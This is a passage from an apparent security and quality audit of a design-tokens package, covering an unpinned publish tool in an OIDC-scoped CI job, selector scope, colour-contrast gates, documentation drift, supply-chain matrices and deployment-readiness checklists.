- **Fix.** `src/index.ts` now reads `import tokens from './tokens.json' with { type: 'json' }`. The
  alternative (generating the values into TypeScript) was rejected: it would add a build step the
  package forbids (CLAUDE.md) and a second source for the same values. `tsc --noEmit` is unchanged
  (`module: ESNext`, `resolveJsonModule`); esbuild and Vite (SSR build) both bundle the entry (scratch
  check, deleted afterwards).
- **Before and after (Deno 2.9.6).** Before: `deno run src/index.ts` fails with the Json-module error.
  After: it runs. Node 24.13 imports the source directly too (type stripping applies outside
  `node_modules`; under `node_modules` Node still refuses, which is why npm consumers use a bundler —
  documented in the `index.ts` TSDoc and the README).
- **Test.** `tests/entry-import.test.mjs`: (1) the source carries the attribute; (2) the entry imports under
  Node and exposes the 11 exports with the expected values; (3) the same under Deno (`deno eval`). Without
  the attribute, all three fail (checked by removing it). Deno is optional locally (skipped when absent) but
  CI sets `REQUIRE_DENO=1` and installs it with the SHA-pinned `denoland/setup-deno` v2.0.5 at Deno 2.9.6, so
  the check cannot be skipped there.
- **JSR dry run in CI.** `node-ci.yml` runs `npx --no-install jsr publish --dry-run` (the pinned CLI), which
  also runs the slow-types check; the tag workflow's `verify` job runs it too.
- **JSR contents.** `jsr.json` now has `publish.include` (`src/index.ts`, `src/tokens.json`, `README.md`,
  `LICENSE`, `CHANGELOG.md`, `jsr.json`). The 0.1.9 dry run listed 21 files, including `scripts/`,
  `tests/`, `package-lock.json` and this audit; the 0.1.10 dry run lists 6.
- **OQ4.** Kept rather than dropped: the registry costs nothing now that the entry works and is checked,
  dropping it would orphan the 4 published versions, and nothing depends on it either way. Revisit only if
  the JSR job becomes a maintenance burden.

### F6 — The global `.dark` class flips every role in any subtree

**Severity:** Info   **Disposition:** RESOLVED (0.1.9, `db4e3ad`)
**Where:** `src/tokens.css:275-276` (`:root[data-theme="dark"], .dark`).

**Issue / Impact:**

- `.dark` was added for VitePress, which toggles `html.dark` (commit `2e71f15`). But it matches
  **any** element with class `dark`, so a third-party widget, a consumer's `class="dark"` or a
  utility framework's dark class silently switches that subtree to dark roles.
- It is not documented in CLAUDE.md or README, which name only `data-theme`.
- Seasons don't compose with `.dark` subtrees either (see F1's per-theme fix).

**Remediation / evidence:** narrow the selector to `html.dark` (VitePress), or document `.dark` as a
supported subtree switch and add it to the F3 selector allowlist.

**Re-verified 2026-10-09 — RESOLVED.** Fixed in 0.1.9 (`db4e3ad`; CHANGELOG 0.1.9 "Changed"): the
class form is `:root.dark` (`tokens.css:280`) and `:root.dark[data-season="…"]` in `seasons.css`, so
it applies on the root element only (VitePress sets `html.dark`) and no longer flips a subtree. The
`check:css` selector allowlist accepts only the `:root`-anchored forms. `CLAUDE.md`, `README.md` and
`SECURITY.md` document it. OQ3 is decided by this change (root only).

### F7 — CI and release details; an unpinned tool runs with the OIDC token

**Severity:** Info (the `npx jsr` item is Low-class if exploited)   **Disposition:** RESOLVED
(0.1.9, `db4e3ad`); unsigned tags ACCEPTED-RISK
**Where:** `.github/workflows/npm-publish.yml:83-90`, `node-ci.yml:40`;
`.github/audit-allowlist.json`.

**Issue / Impact:**

- **Unpinned `jsr` with the OIDC token in scope.** `npx jsr publish` downloads the **latest** `jsr`
  CLI from npm at publish time. It is not in the lockfile and has no version.
  - It runs in the same job as `npm publish`, with `id-token: write`.
  - Any step in that job can mint OIDC tokens, which npm trusted publishing (bound to repo +
    workflow) and JSR both accept.
  - So a compromised `jsr` release could publish an arbitrary `@meddleware/design-tokens` version
    to npm *with valid provenance* (F3's impact).
  - TS lens B.TS-3 requires publish tooling to be pinned, not `@latest`.
- **Lint gaps.** stylelint runs in Node CI with `--if-present` and not at all in publish `verify`
  (F3).
- **No packaging check.** No `npm pack --dry-run` check of the tarball file list.
- **Allowlist reason.** The reason text says the advisory is reached "through … stylelint and
  `@vue/eslint-config-typescript`". The latter is not a dependency here (copied from another repo).
  The gate also does not validate the `package` field.
- **Unsigned tags.** `v*` tags are lightweight and unsigned.

**Remediation / evidence:**

- Pin `jsr` as a devDependency (lockfile) and run `npx --no-install jsr publish`, or
  `npx jsr@<exact>`.
- Split JSR and npm publishing into separate jobs, each with its own `id-token: write`.
- Drop `--if-present`; run lint in `verify`.
- Fix the allowlist reason.

**Re-verified 2026-10-09 — RESOLVED.** Fixed in 0.1.9 (`db4e3ad`; CHANGELOG 0.1.9 "Changed"/"Added").

- **Unpinned `jsr` — RESOLVED.** `jsr` 0.14.3 is an exact devDependency in `package-lock.json`; the
  JSR job runs `npm ci` then `npx --no-install jsr publish`. npm and JSR publish in separate jobs
  (`publish-npm`, `publish-jsr` in `npm-publish.yml`), each with its own `id-token: write`, so the JSR
  CLI no longer runs in the job that holds the npm publisher's token.
- **Lint and release gate — RESOLVED.** The publish `verify` job is `uses: ./.github/workflows/node-ci.yml`
  (`workflow_call`), so the tag runs the same checks as CI: audit gate, versions, sync, contrast, CSS
  contract, tests, type-check and stylelint (no `--if-present`).
- **Packaging check — RESOLVED.** node-ci runs `npm pack --dry-run --json` and fails on a missing or
  unexpected file or an unpacked size over 200 kB (today 45.2 kB, 7 files).
- **Allowlist reason — RESOLVED.** The reason now reads "micromatch via fast-glob in stylelint" (no
  mention of `@vue/eslint-config-typescript`). The gate keys on the GHSA id and does not validate the
  informational `package` field; harmless, not changed.
- **Dependabot — in place.** `.github/dependabot.yml`: weekly grouped npm (minor/patch) and
  github-actions updates (base §B.2 requirement).
- **Unsigned tags — ACCEPTED-RISK.** `v0.1.9` is a lightweight tag (`git cat-file -t` → `commit`). The
  tag only triggers the workflow; `verify` re-runs against the tagged commit, npm's trusted publisher is
  bound to the repo and workflow, and the tarball carries provenance. Signing would add key custody for
  no change in what is published.

### F8 — Documentation drift

**Severity:** Info   **Disposition:** RESOLVED for the items below (0.1.9, `db4e3ad`); residual
drift is F12

| Document | Drift |
| --- | --- |
| README role table (`:126-145`) | `--accent`/`--primary` are "red `#d92d20` / `#ef5a4c`" (actual terracotta `#b84527` / `#e07850` and moss `#2b7a56` / `#5aaa80`); `--secondary` "blue" (actual slate `#4e5f9e` / `#9ba8d4`); `--focus-ring` "blue `#1d6fe0`" (actual slate); dark `--primary-contrast` `#201b19` (actual `#0b0809`) |
| README `:77`, `tokens.css:31`, `seasons.css:8` | example `--accent: var(--season-accent, var(--mw-red-500))` (actual terracotta) |
| README `:240`, AGENTS.md `:66`, `:68` | `publish.yml` (actual `npm-publish.yml`) |
| AGENTS.md | "Oxblood / Indigo palette"; "three entry points" (there are four); "kept in sync by hand" (now `check:sync`); brand ramps described as Layer 1 in use |
| `package.json` description | "Oxblood/Indigo palette" |
| `index.ts` TSDoc | "Oxblood / Indigo design tokens"; `semantic.dark.accent // '#b0465a'` (actual `#e07850`); example `brand.oxblood['050']` (not in `tokens.json`, so it returns `undefined` and is a TS error) |
| CLAUDE.md | "Focus uses `--focus-ring` (a distinct blue)" (slate; red in summer — F1) |
| SECURITY.md | invariant 1 wording and scope (F3) |
| CHANGELOG | no entries for 0.1.2–0.1.7; the 0.1.8 AA claim (F2) |

Consumers and agents read these tables as the contract. The README table is the one most likely to
be copied into component code.

**Re-verified 2026-10-09 — RESOLVED.** `db4e3ad` corrected: the README role table (terracotta/moss/
slate values, `--primary-contrast`, `--focus-ring` slate, new `--warning-text` row), the README `:77`
example, the `publish.yml` → `npm-publish.yml` names in README, AGENTS.md and CLAUDE.md, AGENTS.md's
palette sentence, entry-point count and "kept in sync by hand" wording, the `package.json` description,
the `index.ts` TSDoc example (`semantic.dark.accent` is `#e07850`) and CLAUDE.md's focus-ring line;
SECURITY.md is rewritten (F3); the CHANGELOG gained a 0.1.9 entry, a combined 0.1.2–0.1.7 summary and
the corrected 0.1.8 AA statement. What is still stale is listed in F12.

### F9 — Positive: consistent, side-effect-free tokens with mechanised sync, contrast, content and version checks

**Severity:** Positive

- **Clean shipped content, now gated.** The CSS is custom-property declarations plus `color-scheme`
  only, enforced by `check:css` (F3). The one inline asset is CSP-compatible with consumers
  (`img-src data:`) and hash-pinned. `index.ts` performs only static re-exports. No runtime
  dependencies, no network, no secrets.
- **`check:sync`** resolves `var()` chains (theme → root → fallback), computes the `calc()` space
  scale, checks light/dark key symmetry and season key symmetry, and ignores comments (F4).
- **`check:contrast`** measures 250 pairings across 2 themes × 5 season states with the browser
  cascade (F1, F2) at 0.1.9, and 370 at 0.1.10 (`--lift` and the panels added, F11); `check:versions`
  keeps the npm and JSR versions equal.
- **Gates have tests.** 37 `node:test` cases (25 at 0.1.9) feed the CSS contract, the sync check and the
  contrast gate the payloads they exist to catch, and import the entry under Node and Deno.
- **Release integrity.**
  - The tag runs the full CI workflow before publishing; the audit gate with an expiring allowlist
    (entries validated, expiry enforced, stale entries reported).
  - SHA-pinned actions; least privilege with `id-token: write` on the two publish jobs only; tag =
    version; idempotent publish to both registries; npm provenance on 0.1.9; the JSR CLI pinned.
  - Grouped weekly Dependabot (npm, actions).
- **A legible default.** Text and muted on every canvas, the status roles including `--warning-text`,
  the interactive roles and their labels, and all panel palettes (the 0.1.8 panel status tokens
  included) meet AA.
- **`sideEffects: ["*.css"]`** is correct for CSS-only imports.

### F10 — access-gate-ui, dao-ui and treasury-ui still draw `--warning` as text

**Severity:** Low   **Disposition:** DEFERRED (consumer follow-up of F2; tracked in the
access-gate-ui, dao-ui and treasury-ui audits and by the pre-mainnet gate in Section D; no code
change made by this audit)
**Where:** access-gate-ui `src/components/GateCard.vue:112` (`.badge--warn { color: var(--warning) }`);
dao-ui and treasury-ui `src/styles/qt.css:172` (`.dao-notice { color: var(--warning) }` on a 10%
warning tint). Re-grepped 2026-10-09 across every consumer `src/`.

**Issue:** these three call sites predate `--warning-text` and still use the bright fill role as
foreground text, which is 2.0:1 on the light `--bg` (F2). The package-side fix does not change them
because `--warning` keeps its value. `@meddleware/ui` (`UiBadge`, `StatusWidget`) and wallet-adapter
already use `--warning-text`; `status-page`, `UiStatusDot` and `StatusWidget` use `--warning` only as a
fill, which is correct.

**Impact:** light-mode "caution" badge text in the access-gate pass card and the DAO-style notice in
dao-ui (retired from the cluster, still published) and treasury-ui is below AA. The package's own
`check:contrast` cannot see it: it measures roles, not the consumers' CSS. In dark mode
`--warning` and `--warning-text` are the same stop, so only light mode is affected.

**2026-10-10 — still DEFERRED (consumer repos).** Nothing in this package can see a consumer's CSS, so a
lint or contract check here cannot prevent the pattern. What the package can do is make the intent
unmissable, and 0.1.10 does: `--warning` carries a "FILL only — never `color:`; use `--warning-text`"
comment in `tokens.css`, the README row says "a **fill**", and CLAUDE.md already requires
`--warning-text` for status text. The fix itself (three `color:` declarations) belongs to the
access-gate-ui, dao-ui and treasury-ui waves.

**Remediation / evidence:** change the three `color:` declarations to `var(--warning-text)` (keep
`--warning` for the border and tint), then release each app. The consumers' real-browser contrast
gate (as in `ui` 0.1.31) would catch a regression; access-gate-ui and treasury-ui should adopt it.

### F11 — The contrast gate does not measure `--lift` or the panel palettes

**Severity:** Info   **Disposition:** RESOLVED (0.1.10, `commit pending`; was ACCEPTED-RISK)
**Where:** `scripts/check-contrast.mjs:15-22` (canvases `bg` and `surface` only; panels not
included); `src/tokens.css` (`--lift`: "hover / raised surface").

**Issue:** S1 listed `--lift` and the panel pairs. A scratch run on 2026-10-09 (WCAG luminance over the
same cascade) shows the text roles on `--lift` are below 4.5:1 in 10 light-theme pairings:

| Season (light) | Role on `--lift` | Ratio |
| --- | --- | --- |
| none | `--accent` / `--primary` / `--warning-text` | 4.49 / 4.37 / 4.46 |
| spring | `--primary` / `--warning-text` | 4.37 / 4.46 |
| summer | `--primary` / `--warning-text` | 4.37 / 4.46 |
| autumn | `--accent` / `--warning-text` | 4.30 / 4.46 |
| winter | `--warning-text` | 4.46 |

All dark-theme pairings pass. All 20 panel-palette pairings (`--mw-panel-{dark,light}-*`, five text
roles on two canvases) pass today, but are not gated.

**Impact:** negligible in practice. `--lift` is the hover and raised-surface background
(`UiButton`, `UiNotice`, `UiBadge`, tab hover); the misses are 0.01 to 0.2 below AA, and the
`@meddleware/ui` real-browser axe gate (0.1.31) measures the real component pairings in every
theme × season and passes.

**Remediation / evidence:** accepted for now. If a component places a text role on `--lift` permanently,
either darken the light `--lift` by one stop or add `lift` to `CANVASES` and the panel pairs to the gate
in the same change as the retune. Revisit with S1.

**Fixed 2026-10-10 — RESOLVED in 0.1.10 (`commit pending`).** The gate and the values changed together, as
the remediation asked:

- **Gate.** `check-contrast.mjs` adds `lift` to `CANVASES` (all nine text roles and the focus ring are
  measured on it, every theme × season) and measures the five text roles of each panel palette on the
  panel's own `bg` and `surface`: 370 pairings (250 + 90 + 10 + 20). Before the retune the gate reported
  exactly the ten failures listed above.
- **Values.** Of the two fixes (lighten `--lift`, or darken the text stops), the text stops were chosen:
  the light `--lift` is `#efeae6`, and reaching 4.5:1 for the worst pairing (autumn accent, 4.30) by
  lightening it needs about `#f4f0ed`, which is nearly the `--bg` (`#f7f4f1`) and would erase the hover
  affordance; the stops need only 1–3% (not visible in use). Changed: `--mw-terracotta-500`
  `#b84527` → `#b74427` (the light accent, 4.49 → 4.54), `--mw-moss-500` `#2b7a56` → `#2a7754` (the light
  primary, 4.37 → 4.55), `--mw-yellow-700` `#8a6500` → `#886400` (`--warning-text`, 4.46 → 4.54; 4.95 on
  `--bg`), `--mw-orange-600` `#b0530c` → `#aa500c` (the autumn accent, 4.30 → 4.55). Ramp names, role
  names and `--lift` are unchanged; the JSON mirror, the README table and the comments follow.
  Contrast on `--bg`, `--surface` and the `-contrast` labels only rises. All dark-theme pairings and the 20
  panel pairings already passed.
- **Test.** `tests/check-contrast.test.mjs` runs the gate on copies of the files: the shipped tokens pass; a
  too-light `--muted`, the previous `--mw-yellow-700` (fails only on `--lift`), a dimmed
  `--mw-panel-dark-muted` and an unresolvable role each fail with the expected message. This also closes
  the "contrast gate has no self-test" half of S3.

---

### F12 — Residual documentation and comment drift after 0.1.9

**Severity:** Info   **Disposition:** RESOLVED (0.1.10, `commit pending`; was DEFERRED)
**Where / Issue** (re-read 2026-10-09 against `61863ad`):

- `src/tokens.css:31` and `src/seasons.css:8` show `--accent: var(--season-accent, var(--mw-red-500))`;
  the actual fallback is `--mw-terracotta-500`.
- `README.md` "Migration note" (`:228`) says `--accent`/`--primary` are "now red" and `--secondary`
  "blue".
- `src/index.ts:80-81, 125` describe the "oxblood/indigo brand palette" as current, and AGENTS.md
  "Layer 1" still presents the brand ramps as in use (CLAUDE.md correctly calls them legacy swatches).
- `CLAUDE.md:119` and `AGENTS.md:69` say JSR publishes with `npx jsr publish`; the workflow runs the
  pinned `npx --no-install jsr publish` in its own job (F7).
- `scripts/check-token-sync.mjs:5-8` still says the files are "hand-synced with no automated guard"
  (a stale header comment on the guard itself, a TS lens *accurate comments* item).

**Impact:** low; the role table and SECURITY.md (the contract documents) are correct. A new component
could still copy the red example.

**Remediation / evidence:** one docs pass over the five places above. Not applied (no code or doc
changes by this audit).

**Fixed 2026-10-10 — RESOLVED in 0.1.10 (`commit pending`).**

- `tokens.css` and `seasons.css` header examples now read `var(--mw-terracotta-500)` (comments only;
  `check:css` still passes).
- README: the migration note describes the terracotta / moss / slate triad (no "now red / blue"); the
  `semantic.light.accent` example value is `#b74427` (it still said the old red `#d92d20`, found while
  fixing this); the exports table lists `secondary`, `status` (deprecated) and `radius`.
- `index.ts` TSDoc: no "oxblood/indigo" as the current palette (`brand` is described as legacy swatches,
  `neutral` no longer "complements" them); the `brand` example no longer uses `semantic` without importing
  it.
- AGENTS.md: Layer 1 lists the functional ramps and the legacy swatches separately; the exports table is
  correct (four entries in `package.json`, two in `jsr.json`); `npx --no-install jsr publish`. CLAUDE.md: the
  same JSR wording, the Deno note and the test list.
- `check-token-sync.mjs`: the header no longer says "hand-synced with no automated guard" and lists the
  checks it runs.
- A grep of the repo (excluding `docs/audit` and CHANGELOG history) finds none of the stale strings.

---

## Section A — Invariant verification matrix

| # | Invariant (source) | Enforced at | Proven by | Status |
| --- | --- | --- | --- | --- |
| A1 | `tokens.css` authoritative; JSON and `index.ts` mirror it (CLAUDE.md) | `check:sync` (every colour role, every subtree exported) | CI; `tests/sync-comments.test.mjs`, `tests/sync-mirror.test.mjs` | HOLDS (F4; 0.1.10 mirrors all roles) |
| A2 | Light/dark role symmetry; season key symmetry in both blocks (CLAUDE.md) | `check:sync` | CI | HOLDS |
| A3 | Status roles ≥ 4.5:1 on `--bg`, `--surface` and `--lift` per theme (CLAUDE.md, CHANGELOG 0.1.9) | `check:contrast` (`--warning-text` for text) | CI; 370 pairings (0.1.10); `tests/check-contrast.test.mjs` | HOLDS (F2, F11); consumers still drawing `--warning` as text — see F10 |
| A4 | Seasons read on every canvas (`seasons.css` header) | `check:contrast`, per-theme season blocks | CI; ui real-browser axe gate | HOLDS (F1); `--lift` and the panel palettes are gated since 0.1.10 (F11) |
| A5 | Focus never reads as an error; ≥ 3:1 (CLAUDE.md, `tokens.css:258`) | `check:contrast` (hue test + 3:1) | CI | HOLDS (F1) |
| A6 | CSS is custom properties only; no `@import` / `content` / `url()` beyond the pinned data URI (SECURITY.md) | `check:css` in CI and publish `verify` | `tests/check-css-contract.test.mjs` (22 payloads) | HOLDS (F3) |
| A7 | No code execution; static exports (SECURITY.md) | — | inspection | HOLDS (code-only) |
| A8 | npm and JSR versions equal (CLAUDE.md) | `check:versions` | CI; both registries at 0.1.9 | HOLDS |
| A9 | `sideEffects` kept; no build step (CLAUDE.md) | — | inspection; pack check | HOLDS (code-only) |
| A10 | Roles colour-agnostic; components use roles only (CLAUDE.md) | — | inspection | HOLDS in this package |
| A11 | `.dark` applies on the root element only (CLAUDE.md, SECURITY.md) | `check:css` selector allowlist | CI | HOLDS (F6) |
| A12 | The `.` entry imports at runtime under Node and Deno (F5) | `tests/entry-import.test.mjs`; `jsr publish --dry-run` | CI with `REQUIRE_DENO=1` | HOLDS from 0.1.10 (the published 0.1.9 entry fails under Deno) |

**TS lens categories.** *Compiler strictness:* `strict`, `noUnusedLocals`, `noUnusedParameters`,
`verbatimModuleSyntax`; `include` is `src/**/*.ts` and `skipLibCheck` hides nothing in it;
`noUncheckedIndexedAccess` is off, recorded: the package parses no untrusted data. *Assertions, runtime
validation, money math, promises, network I/O, encoding, test-only paths, caller-keyed lookups:* N/A
(static CSS/JSON; no I/O, no amounts, no lookups by caller key). *Secrets in output, dynamic code:*
HOLDS (A7). *Accurate comments:* the stale header comment and the other drift items are fixed in 0.1.10 (F12).

---

## Section B — Supply-chain, publish-authority & capability matrix

### B.1 Dependency & CVE risk

| Dependency | Range (locked) | Shipped? | Status | Notes |
| --- | --- | --- | --- | --- |
| `stylelint` | `^17.16.0` (17.16.0) | no (dev) | high advisory via micromatch → braces (GHSA-vfj7-8cjw-p6xm) | allowlisted to 2027-01-01; repository-controlled globs only |
| `stylelint-config-standard` | `^40.0.0` (40.0.0) | no | inherits the above | |
| `postcss` | `^8.5.29` (8.5.29) | no | clean | |
| `typescript` | `~6.0.0` (6.0.3) | no | clean | TypeScript 7 deferred (decision) |
| `jsr` CLI | `0.14.3` exact (locked) | no (publish tool) | clean | pinned since 0.1.9 (F7) |

`npm audit --omit=dev`: 0. The tarball has no dependencies. Shared-dependency matrix (TS lens B.1): the
package uses none of `@mysten/*`, `vue` or `vitest` (tests are `node:test`), so there is nothing to
align with ADR-0001; the only baseline dependency is `typescript` (`~6.0.0`, as the other repos).
TS-M9 (peer dependencies for `@mysten/*`, `.d.ts`): N/A.

### B.2 Publish authority & CI

| Authority | Where | Custody | Gates |
| --- | --- | --- | --- |
| npm publish `@meddleware/design-tokens` | `npm-publish.yml` job `publish-npm` (tag `v*`) | OIDC trusted publishing + `--provenance` | `verify` = the full node-ci workflow (audit gate, versions, sync, contrast, CSS contract, tests, type-check, lint, pack check) |
| JSR publish | `publish-jsr` job (own `id-token: write`) | OIDC | same `verify` (which now includes `jsr publish --dry-run` and the Deno import test); idempotent check via `api.jsr.io`; `npx --no-install jsr publish` of the lockfile-pinned CLI |

No long-lived registry credential exists for this package, so there is no credential inventory to keep.

#### CI & release integrity

| Item | Holds? | Evidence |
| --- | --- | --- |
| Actions pinned to SHAs | Yes | all `uses:` in both workflows |
| Least privilege | Yes | `contents: read` at the top; `id-token: write` on the two publish jobs only |
| OIDC trusted publishing | Yes | npm `--provenance` (0.1.9 attested); JSR OIDC |
| Tag ↔ version, npm ↔ JSR | Yes | "Tag matches the package version" step; `check:versions` |
| Tag-gated, idempotent publish | Yes | registry check before publishing, both registries |
| Release gate equals CI | Yes | `verify` is `uses: ./.github/workflows/node-ci.yml` |
| Automated dependency updates | Yes | `.github/dependabot.yml`: npm and github-actions, weekly, grouped |
| Audit gate with expiring allowlist, in CI and publish | Yes | `.github/audit-gate.mjs`; runs in node-ci and so in `verify` |
| Publish tooling pinned | Yes | `jsr` 0.14.3 in the lockfile (F7) |
| Shipped-content contract check | Yes | `check:css` (F3) |
| Lint in publish verify | Yes | `lint:css` in node-ci, no `--if-present` |
| Package-contents check | Yes | pack step in node-ci; JSR dry run (0.1.10) |
| Signed tags | No | lightweight tags — ACCEPTED-RISK (F7) |
| Container image / real-funds / test-mode items | N/A | no image, no chain, no test mode |

### B.TS-1 Packaging

| Check | Result |
| --- | --- |
| `exports` / `types` | four explicit entries; `types` → `.ts` source; the JSON import carries `with { type: 'json' }` (F5) |
| `files` | `["src"]` → 7 files; no tests, scripts or config; node-ci fails on any extra file or unpacked size over 200 kB. JSR: `publish.include` → 6 files (`src/index.ts`, `src/tokens.json`, README, LICENSE, CHANGELOG, `jsr.json`) |
| `sideEffects` | `["*.css"]` — accurate |
| Ships-source type-check under consumer settings | the package's own `tsc` has `resolveJsonModule`; consumers need it too (every workspace consumer type-checks in its own CI). Node and Deno import the entry directly in `npm test` (F5; Node still refuses it under `node_modules`) |

### B.TS-2 Install-time code

None: no lifecycle scripts (`scripts` holds only `check*`, `lint*`, `test`, `type-check`), no `overrides`,
no `allowScripts`. The dev-dependency tree has none flagged.

### B.TS-3 Supply-chain gates

Lockfile committed; both workflows install with `npm ci`; the publish-npm job uses the npm bundled
with Node 24 (not `npm@latest`); the audit gate runs at high/critical with the expiring allowlist in CI
and, through `verify`, before publish. Holds.

---

## Section C — Test-coverage & hermetic/live split

### C.1 Coverage grade — A- (consistency, contrast, content and the runtime entry are gated and every gate is tested; the sync check has no reordered-block fixture)

Framework: `node --test`, **37 tests, all passing** on 2026-10-10 at 0.1.10 (23 in
`check-css-contract.test.mjs`, 2 in `sync-comments.test.mjs`, 4 in `sync-mirror.test.mjs`, 5 in
`check-contrast.test.mjs`, 3 in `entry-import.test.mjs`; the Deno test needs `deno` and is skipped
without it unless `REQUIRE_DENO=1`, which CI sets). At 0.1.9 there were 25 tests (grade B). `npm test`
lists the files explicitly, so a new test file must be added to the script. `tsc --noEmit` and stylelint
run in CI.

| Dimension | Assessment |
| --- | --- |
| Consistency (CSS ↔ JSON ↔ TS, themes, seasons) | mechanised; comment handling, a drifted value, a missing role and a missing export are tested (F4) |
| Contrast (stated invariant) | mechanised: 370 pairings, every theme × season on `--bg`, `--surface`, `--lift`, plus the panel palettes (F1, F2, F11) |
| Runtime entry | `.` imported under Node and Deno (F5) |
| Shipped-content contract (stated invariant) | mechanised and tested with 22 payloads in both files (F3) |
| Validator self-tests | CSS contract: yes. Sync: comments, drifted value, missing role, missing export (no reordered-block fixture). Contrast: yes (known-bad `--muted`, `--warning-text` on `--lift`, panel, unresolvable role) |

### C.2 Hermetic vs. live paths

All hermetic. The "live" dimension is consumers rendering with `data-season` set; `@meddleware/ui`'s
Playwright + axe gate covers it across every theme × season (F1). The registry state (npm, JSR) is
checked by the publish workflow's idempotency probes, not by a test.

---

## Section D — Deployment-readiness gates

*(For a token package, the gates track the consumers'.)*

### pre-localnet

- [x] declarations-only CSS today; no runtime dependencies; sync, version and audit gates — F9
- [x] CSS content contract enforced in CI and publish — F3 (`check:css`, `npm-publish.yml` `verify`)
- [x] validator ignores comments — F4 (`tests/sync-comments.test.mjs`)

### pre-testnet *(consumers are live on testnet; unmet items are retroactive)*

- [x] status roles ≥ 4.5:1 in both themes (warning) — F2 (`--warning-text`; consumer call sites: F10)
- [x] seasons AA in both themes — F1 (per-theme season blocks; seasons stay enabled in the apps)
- [x] contrast gate in CI (theme × season) — S1 (`check:contrast`, 250 pairings at 0.1.9; 370 at 0.1.10 with `--lift` and the panels, F11)
- [x] `SECURITY.md` present and consistent with the gates — F3
- [x] npm pack contents verified; install-time code inventoried (none) — B.TS-1, B.TS-2
- [x] audit gate in CI and publish; release gate equals CI — F7

### pre-mainnet

- [x] `jsr` pinned; npm and JSR publishing split by job — F7
- [x] JSR entry verified under Deno — F5 (0.1.10: import attribute; `tests/entry-import.test.mjs` under Node and Deno, `REQUIRE_DENO=1` in CI; `jsr publish --dry-run` in CI; OQ4 decided: JSR kept; `commit pending`)
- [x] docs corrected (residual items) — F12 (0.1.10; `commit pending`)
- [ ] consumers use `--warning-text` for text (access-gate-ui, dao-ui, treasury-ui) — F10
- [ ] external review (maintainer item)

---

## Cross-project themes

- **Supply chain & release integrity.** Lockfile committed; actions SHA-pinned; the JSR CLI pinned;
  CVE status at review: one allowlisted dev-only advisory, clean runtime; publish authority is
  OIDC-only, with provenance on npm.
- **Wire-format coupling & conformance vectors.** The token contract is `tokens.css` ↔ `tokens.json`
  ↔ `index.ts`, guarded by `check:sync`; the consumer contract is the role set plus the season
  `--season-*` key set. N/A beyond that (no client/server pair).
- **On-chain-truth boundary.** N/A: the package holds no chain logic. Its CSS sits on the signing-
  preview path of every app, which is why F3's content contract matters (VUE-M4).
- **Deployment readiness.** Section D, current.
- **Chain-access layering & ID/ABI coupling.** N/A (no package or object IDs).
- **A11y assumptions flow downstream.** The role pairs are now measured in every theme × season, here
  (roles, including `--lift` and the panel palettes since 0.1.10) and in ui (rendered components).
  Consumers' VUE-lens audits may credit "tokens meet AA" for the measured roles, except where a consumer
  draws `--warning` as text (F10).
- **Global CSS is part of the signing surface.** Every app loads this package's CSS unscoped; F3's
  gate protects all of them at once.
- **Publish tooling in OIDC-scoped jobs.** The `npx <tool>@latest`-in-a-publish-job pattern was
  fixed here (F7); it is worth checking in every repository that publishes to JSR.
- **Versioning policy.** Pre-v0.2: patch-only bumps until go-live. 0.1.9 changed role values without
  shims, as the policy allows; consumers moved to `^0.1.9` in step (13 of 13). 0.1.10 keeps every public
  token and export name (it adds exports and JSON keys, and moves four ramp stops by 1–3%), so the `^0.1.9`
  ranges take it without edits.

---

## Normative requirements (MUST / MUST NOT)

1. MUST keep every text role ≥ 4.5:1, and every focus or boundary role ≥ 3:1, against its canvas in
   every shipped theme × season combination — **holds** (`check:contrast`, F1, F2, F11): the text roles
   are measured on `--bg`, `--surface` and `--lift`, and the panel palettes on their own canvases.
2. MUST ship CSS that contains only allow-listed selectors and custom-property declarations,
   enforced in CI and in publish verification — **holds** (`check:css`, F3).
3. MUST NOT run unpinned tooling in a job that can mint publish credentials — **holds** (F7).
4. MUST keep the JSON mirror a faithful mirror of the roles it names — **holds** from 0.1.10 (F4):
   `semantic` mirrors every colour role and `check:sync` fails on drift or a missing role. The deprecated
   `status` subtree is the legacy ramp stops (`status.ok` differs from `--ok`) and is not a role mirror.
5. MUST NOT draw a fill role as text: consumers use `--warning-text` for `color:` — **does not hold**
   in three call sites (F10).

**TS lens baseline:**

| ID | Holds? | Evidence |
| --- | --- | --- |
| TS-M1 | yes (`strict`; no assertions) | `tsconfig.json` |
| TS-M2 | N/A (no inputs) | — |
| TS-M3 / TS-M4 / TS-M5 | N/A | — |
| TS-M6 | yes (no logging, no dynamic code) | A7 |
| TS-M7 | yes (`files: ["src"]`; no install scripts; pack check in CI) | B.TS-1, B.TS-2 |
| TS-M8 | yes (`npm ci` + audit gate in CI and publish; publish tooling pinned) | B.TS-3, F7 |
| TS-M9 | N/A (no `@mysten/*` dependency) | B.1 |

## Implementation suggestions (SHOULD / MAY)

- **S1** *(done in 0.1.9, completed in 0.1.10)* `scripts/check-contrast.mjs` in CI and publish verify
  covers text roles on `--bg`, `--surface` and `--lift`, the `-contrast` labels, `--focus-ring` and the
  panel pairs (F11).
- **S2** *(done in 0.1.9)* the CSS content-contract script with the hash-pinned `--noise-overlay`.
- **S3** *(mostly done in 0.1.10)* the contrast gate has known-bad fixtures and the sync check has a
  drifted-value, missing-role and missing-export fixture. Still open: a reordered-block fixture for the
  sync check.
- **S4** MAY publish a machine-readable `roles.json` (every role × theme × season, resolved). It would
  let consumers' a11y tests and the docs site render from the same values (F4's partial mirror is
  already gone: `semantic` mirrors every role, no-season).
- **S5** *(done in 0.1.10)* the Deno entry import and `jsr publish --dry-run` run in CI (F5).

## Open questions (`OQ#`)

1. **OQ1** F1: should seasons remain enabled by default in apps (`useSeason()`) while the per-theme
   season values are designed, or be switched off until S1 passes? (Decided 2026-10-08, by the 0.1.9
   release: seasons stay enabled; the per-theme values and the gate landed together — see F1)
2. **OQ2** F2: retune `--warning` itself (affecting fills), or add `--warning-text` and move the
   consumers' `color:` uses to it? (Decided 2026-10-08: add `--warning-text`, keep `--warning` as the
   fill — see F2, F10)
3. **OQ3** F6: is `.dark` meant as a general subtree switch, or only for VitePress (`html.dark`)?
   (Decided 2026-10-08: root element only, `:root.dark` — see F6)
4. **OQ4** F5: is JSR a supported distribution for this package (CSS cannot be exported there), or
   should JSR publishing be dropped? (Decided 2026-10-10 by the 0.1.10 fix wave: kept. The import-
   attribute fix, the Deno import test and the JSR dry run are in; JSR carries `.` and `tokens.json`
   only, and `jsr.json` has `publish.include`. Nothing depends on JSR, so revisit only if the JSR job
   becomes a burden — see F5)

## Risks

- **Global-CSS supply chain:** one package's CSS reaches every signing screen. The content gate and
  provenance reduce the chance of an unnoticed malicious publish, but a compromised maintainer account
